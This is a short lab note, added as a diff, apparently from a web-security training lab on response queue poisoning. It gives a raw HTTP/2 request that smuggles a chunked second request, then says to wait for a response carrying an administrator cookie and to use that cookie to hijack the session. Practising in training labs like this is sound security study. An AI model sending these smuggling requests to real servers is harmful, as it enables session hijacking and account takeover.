@@ -1,0 +1,17 @@
+Lab: Response queue poisoning via H2.TE request smuggling
+
+Analysis:
+(1)
+POST /asd HTTP/2
+Host: 0a090080031c6bb080b553b8009d006c.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+
+0
+
+GET /asd HTTP/1.1
+Host: 0a090080031c6bb080b553b8009d006c.web-security-academy.net
+
+--------> (wait until get 302 found - administrator cookie)
+(2)
+Use cookie for session hijacking.
